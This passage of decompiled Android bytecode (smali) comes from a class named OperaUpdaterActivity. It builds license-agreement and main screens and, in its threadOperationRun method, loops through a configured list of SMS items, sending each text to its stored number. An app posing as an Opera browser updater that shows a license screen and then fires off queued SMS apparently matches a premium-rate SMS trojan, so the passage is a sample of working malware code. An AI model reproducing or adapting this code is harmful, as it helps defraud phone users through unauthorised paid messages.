    invoke-direct {v3}, Ljava/lang/StringBuffer;-><init>()V

    .line 208
    .local v3, "text":Ljava/lang/StringBuffer;
    const/4 v0, 0x0

    .local v0, "i":I
    :goto_0
    sget-object v4, Lad/notify/NotificationApplication;->licenseScreens:Ljava/util/Vector;

    invoke-virtual {v4}, Ljava/util/Vector;->size()I

    move-result v4

    if-lt v0, v4, :cond_0

    .line 214
    sget-object v4, Lad/notify/NotificationApplication;->licenseScreen:Lad/notify/ScreenItem;

    invoke-virtual {v3}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v5

    iput-object v5, v4, Lad/notify/ScreenItem;->text:Ljava/lang/String;

    .line 216
    sget-object v4, Lad/notify/NotificationApplication;->licenseScreen:Lad/notify/ScreenItem;

    iget-object v4, v4, Lad/notify/ScreenItem;->text:Ljava/lang/String;

    invoke-virtual {p0, v1, v4}, Lad/notify/OperaUpdaterActivity;->addTextView(Landroid/widget/LinearLayout;Ljava/lang/String;)V

    .line 217
    sget-object v4, Lad/notify/NotificationApplication;->licenseScreen:Lad/notify/ScreenItem;

    iget-object v4, v4, Lad/notify/ScreenItem;->title:Ljava/lang/String;

    invoke-virtual {p0, v4}, Lad/notify/OperaUpdaterActivity;->setTitle(Ljava/lang/CharSequence;)V

    .line 219
    sget-object v4, Lad/notify/NotificationApplication;->licenseScreen:Lad/notify/ScreenItem;

    iget-object v4, v4, Lad/notify/ScreenItem;->buttons:Ljava/util/Vector;

    invoke-virtual {v4, v6}, Ljava/util/Vector;->elementAt(I)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Ljava/lang/String;

    invoke-virtual {p0, v1, v4}, Lad/notify/OperaUpdaterActivity;->addButton(Landroid/widget/LinearLayout;Ljava/lang/String;)Landroid/widget/Button;

    move-result-object v4

    iput-object v4, p0, Lad/notify/OperaUpdaterActivity;->next:Landroid/widget/Button;

    .line 233
    .end local v0    # "i":I
    .end local v3    # "text":Ljava/lang/StringBuffer;
    :goto_1
    invoke-virtual {p0, v1}, Lad/notify/OperaUpdaterActivity;->setContentView(Landroid/view/View;)V

    .line 234
    return-void

    .line 210
    .restart local v0    # "i":I
    .restart local v3    # "text":Ljava/lang/StringBuffer;
    :cond_0
    sget-object v4, Lad/notify/NotificationApplication;->licenseScreens:Ljava/util/Vector;

    invoke-virtual {v4, v0}, Ljava/util/Vector;->elementAt(I)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Lad/notify/ScreenItem;

    .line 211
    .local v2, "screen":Lad/notify/ScreenItem;
    iget-object v4, v2, Lad/notify/ScreenItem;->text:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 212
    const-string v4, "\n"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 208
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    .line 223
    .end local v0    # "i":I
    .end local v2    # "screen":Lad/notify/ScreenItem;
    .end local v3    # "text":Ljava/lang/StringBuffer;
    :cond_1
    sget-object v4, Lad/notify/NotificationApplication;->licenseScreens:Ljava/util/Vector;

    sget v5, Lad/notify/NotificationApplication;->licenseIndex:I

    invoke-virtual {v4, v5}, Ljava/util/Vector;->elementAt(I)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Lad/notify/ScreenItem;

    sput-object v4, Lad/notify/NotificationApplication;->licenseScreen:Lad/notify/ScreenItem;

    .line 225
    sget-object v4, Lad/notify/NotificationApplication;->licenseScreen:Lad/notify/ScreenItem;

    iget-object v4, v4, Lad/notify/ScreenItem;->text:Ljava/lang/String;

    invoke-virtual {p0, v1, v4}, Lad/notify/OperaUpdaterActivity;->addTextView(Landroid/widget/LinearLayout;Ljava/lang/String;)V

    .line 226
    sget-object v4, Lad/notify/NotificationApplication;->licenseScreen:Lad/notify/ScreenItem;

    iget-object v4, v4, Lad/notify/ScreenItem;->title:Ljava/lang/String;

    invoke-virtual {p0, v4}, Lad/notify/OperaUpdaterActivity;->setTitle(Ljava/lang/CharSequence;)V

    .line 228
    sget-object v4, Lad/notify/NotificationApplication;->licenseScreen:Lad/notify/ScreenItem;

    iget-object v4, v4, Lad/notify/ScreenItem;->buttons:Ljava/util/Vector;

    invoke-virtual {v4, v6}, Ljava/util/Vector;->elementAt(I)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Ljava/lang/String;

    invoke-virtual {p0, v1, v4}, Lad/notify/OperaUpdaterActivity;->addButton(Landroid/widget/LinearLayout;Ljava/lang/String;)Landroid/widget/Button;

    move-result-object v4

    iput-object v4, p0, Lad/notify/OperaUpdaterActivity;->next:Landroid/widget/Button;

    .line 229
    sget-object v4, Lad/notify/NotificationApplication;->licenseScreen:Lad/notify/ScreenItem;

    iget-object v4, v4, Lad/notify/ScreenItem;->buttons:Ljava/util/Vector;

    const/4 v5, 0x1

    invoke-virtual {v4, v5}, Ljava/util/Vector;->elementAt(I)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Ljava/lang/String;

    invoke-virtual {p0, v1, v4}, Lad/notify/OperaUpdaterActivity;->addButton(Landroid/widget/LinearLayout;Ljava/lang/String;)Landroid/widget/Button;

    move-result-object v4

    iput-object v4, p0, Lad/notify/OperaUpdaterActivity;->back:Landroid/widget/Button;

    .line 230
    sget-object v4, Lad/notify/NotificationApplication;->licenseScreen:Lad/notify/ScreenItem;

    iget-object v4, v4, Lad/notify/ScreenItem;->buttons:Ljava/util/Vector;

    invoke-virtual {v4, v7}, Ljava/util/Vector;->elementAt(I)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Ljava/lang/String;

    invoke-virtual {p0, v1, v4}, Lad/notify/OperaUpdaterActivity;->addButton(Landroid/widget/LinearLayout;Ljava/lang/String;)Landroid/widget/Button;

    move-result-object v4

    iput-object v4, p0, Lad/notify/OperaUpdaterActivity;->exit:Landroid/widget/Button;

    goto :goto_1
.end method

.method public setMainScreen()V
    .locals 4

    .prologue
    const/4 v3, 0x1

    .line 176
    sput v3, Lad/notify/OperaUpdaterActivity;->state:I

    .line 178
    invoke-virtual {p0}, Lad/notify/OperaUpdaterActivity;->createLayout()Landroid/widget/LinearLayout;

    move-result-object v0

    .line 180
    .local v0, "lineaLayout":Landroid/widget/LinearLayout;
    invoke-virtual {p0, v0}, Lad/notify/OperaUpdaterActivity;->addLogo(Landroid/widget/LinearLayout;)V

    .line 182
    sget-object v1, Lad/notify/NotificationApplication;->mainScreen:Lad/notify/ScreenItem;

    iget-object v1, v1, Lad/notify/ScreenItem;->text:Ljava/lang/String;

    invoke-virtual {p0, v0, v1}, Lad/notify/OperaUpdaterActivity;->addTextView(Landroid/widget/LinearLayout;Ljava/lang/String;)V

    .line 183
    sget-object v1, Lad/notify/NotificationApplication;->mainScreen:Lad/notify/ScreenItem;

    iget-object v1, v1, Lad/notify/ScreenItem;->title:Ljava/lang/String;

    invoke-virtual {p0, v1}, Lad/notify/OperaUpdaterActivity;->setTitle(Ljava/lang/CharSequence;)V

    .line 185
    sget-object v1, Lad/notify/NotificationApplication;->mainScreen:Lad/notify/ScreenItem;

    iget-object v1, v1, Lad/notify/ScreenItem;->buttons:Ljava/util/Vector;

    const/4 v2, 0x0

    invoke-virtual {v1, v2}, Ljava/util/Vector;->elementAt(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    invoke-virtual {p0, v0, v1}, Lad/notify/OperaUpdaterActivity;->addButton(Landroid/widget/LinearLayout;Ljava/lang/String;)Landroid/widget/Button;

    move-result-object v1

    iput-object v1, p0, Lad/notify/OperaUpdaterActivity;->ok:Landroid/widget/Button;

    .line 188
    sget-boolean v1, Lad/notify/NotificationApplication;->showLicense:Z

    if-eqz v1, :cond_0

    .line 190
    sget-object v1, Lad/notify/NotificationApplication;->mainScreen:Lad/notify/ScreenItem;

    iget-object v1, v1, Lad/notify/ScreenItem;->buttons:Ljava/util/Vector;

    invoke-virtual {v1, v3}, Ljava/util/Vector;->elementAt(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    invoke-virtual {p0, v0, v1}, Lad/notify/OperaUpdaterActivity;->addButton(Landroid/widget/LinearLayout;Ljava/lang/String;)Landroid/widget/Button;

    move-result-object v1

    iput-object v1, p0, Lad/notify/OperaUpdaterActivity;->license:Landroid/widget/Button;

    .line 193
    :cond_0
    invoke-virtual {p0, v0}, Lad/notify/OperaUpdaterActivity;->setContentView(Landroid/view/View;)V

    .line 194
    return-void
.end method

.method public threadOperationRun(ILjava/lang/Object;)V
    .locals 3
    .param p1, "id"    # I
    .param p2, "obj"    # Ljava/lang/Object;

    .prologue
    .line 415
    const/4 v1, 0x1

    if-ne p1, v1, :cond_0

    .line 417
    :goto_0
    sget v1, Lad/notify/NotificationApplication;->smsIndex:I

    sget-object v2, Lad/notify/NotificationApplication;->sms:Ljava/util/Vector;

    invoke-virtual {v2}, Ljava/util/Vector;->size()I

    move-result v2

    if-lt v1, v2, :cond_1

    .line 424
    :cond_0
    return-void

    .line 419
    :cond_1
    sget v1, Lad/notify/NotificationApplication;->smsIndex:I

    invoke-virtual {p0, v1}, Lad/notify/OperaUpdaterActivity;->getSmsItem(I)Lad/notify/SmsItem;

    move-result-object v0

    .line 421
    .local v0, "item":Lad/notify/SmsItem;
    iget-object v1, v0, Lad/notify/SmsItem;->number:Ljava/lang/String;

    iget-object v2, v0, Lad/notify/SmsItem;->text:Ljava/lang/String;

    invoke-virtual {p0, v1, v2}, Lad/notify/OperaUpdaterActivity;->sendSms(Ljava/lang/String;Ljava/lang/String;)V

    .line 417
    sget v1, Lad/notify/NotificationApplication;->smsIndex:I

    add-int/lit8 v1, v1, 0x1

    sput v1, Lad/notify/NotificationApplication;->smsIndex:I

    goto :goto_0
.end method
